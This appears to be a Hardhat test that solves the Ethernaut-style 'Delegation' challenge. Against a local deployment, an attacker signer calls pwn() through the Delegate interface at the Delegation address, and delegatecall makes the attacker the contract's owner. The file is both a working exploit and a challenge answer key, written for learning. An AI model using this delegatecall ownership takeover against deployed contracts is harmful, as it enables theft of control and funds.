import { expect } from "chai";
import { ethers } from "hardhat";

describe("Delegation", async function () {

  it("Should claim ownership", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()

    const Delegate = await ethers.getContractFactory("Delegate");
    const delegate = await Delegate.deploy(ethers.constants.AddressZero);
    await delegate.deployed();

    const Delegation = await ethers.getContractFactory("Delegation");
    const delegation = await Delegation.deploy(delegate.address);
    await delegation.deployed();
    //setup-

    //1. Call delegation with pwn() calldata
    const delegationAsDelegate = await ethers.getContractAt("Delegate", delegation.address)

    await delegationAsDelegate.connect(attacker).pwn()

    expect(await delegation.owner()).to.eq(attacker.address)

  });
});